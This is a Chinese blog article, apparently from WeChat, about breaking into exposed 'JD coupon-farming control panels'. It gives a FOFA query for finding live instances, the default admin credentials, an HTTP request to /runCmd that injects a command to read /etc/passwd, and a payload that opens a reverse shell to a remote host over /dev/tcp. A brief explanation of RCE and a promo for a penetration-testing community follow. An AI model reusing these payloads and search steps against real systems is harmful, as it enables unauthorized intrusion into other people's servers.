> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/H9igbpFNeHVFAVWoKhQu7g)

fofa 语法：  

title="京东薅羊毛控制面板"

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv2RpQ2BlGJrFWrm2ISdNTE4Qf1n6b60F6FibxDCJm0ia2WQzjic07hgXIQ5EZo3ASM6ibgeY8cQh3g5WQ/640?wx_fmt=png)

我们随便点一个进去，是个后台登陆页面  

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv2RpQ2BlGJrFWrm2ISdNTE4dPRCaIz5b007wnVpJupJCqLZTTZQq4tHm4WLB9IfvqnIeMlQVDQB8A/640?wx_fmt=png)

默认账号密码为

useradmin/supermanito

不料，成功进入。  

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv2RpQ2BlGJrFWrm2ISdNTE4Z6S3nzsgUhkufHuGYrIYkFryscgH72icSxJUJMGgCpPGNb8iaGTCp9nA/640?wx_fmt=png)

接着我们使用 POC  

```
POST /runCmd HTTP/1.1
Host: 192.168.1.1:5678
Content-Length: 50
Pragma: no-cache
Cache-Control: no-cache
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: connect.0.6356777726800276=s%3Av1W6DxlSqnPpVgvMCItxElFeKI1Psh4i.eE4ORs0Yz30N0TOg1pUVpOqrpIHyrqIimuXJVO8lE7U
Connection: close

cmd=bash+jd.sh+%3Bcat /etc/passwd%3B+now&delay=500
```

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv2RpQ2BlGJrFWrm2ISdNTE4ef2NZUAftGgrqcFJCURUrAmhRkOGqu5IdADfibRb8wuUYKrypLnQ8aA/640?wx_fmt=png)

反弹 shell  

```
cmd=bash+jd.sh+%3Bbash+-c+'exec+bash+-i+%26%3E%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999+%3C%261'%3B+now&delay=500
```

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv2RpQ2BlGJrFWrm2ISdNTE4uXGkSEicKHPqG4jzz7zRya9D3vllgIPLNXLLpRUgicuALLeLhnBMY6xQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv2RpQ2BlGJrFWrm2ISdNTE4WCK2lTVE3xhCIaibib1WyNdkNMic3y4Sziaz7U4StXQv9kPc40Xh2kIoDg/640?wx_fmt=png)

RCE 英文全称：remote command/code execute

分为远程命令执行 ping 和远程代码执行 evel。

漏洞出现的原因：没有在输入口做输入处理。

我们常见的路由器、防火墙、入侵检测等设备的 web 管理界面上

一般会给用户提供一个 ping 操作的 web 界面，用户从 web 界面输入目标 IP，提交后，后台会对该 IP 地址进行一次 ping 测试，并返回测试结果。其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是 RCE 漏洞。

bgbing 星球：渗透测试, 内网渗透, SRC 漏洞分享, 安全开发, 安全武器库

（加入星球送 fofa 永久会员，送 xray 高级版，送奈飞 Netflix 账号）

![](https://mmbiz.qpic.cn/mmbiz_png/NOwiaSy3Kbv2RpQ2BlGJrFWrm2ISdNTE4WibuW6DyWypzKicAmwziagawPiaVpOXVtxNRMgj1K8Rsee2HrrufXeG6KA/640?wx_fmt=png)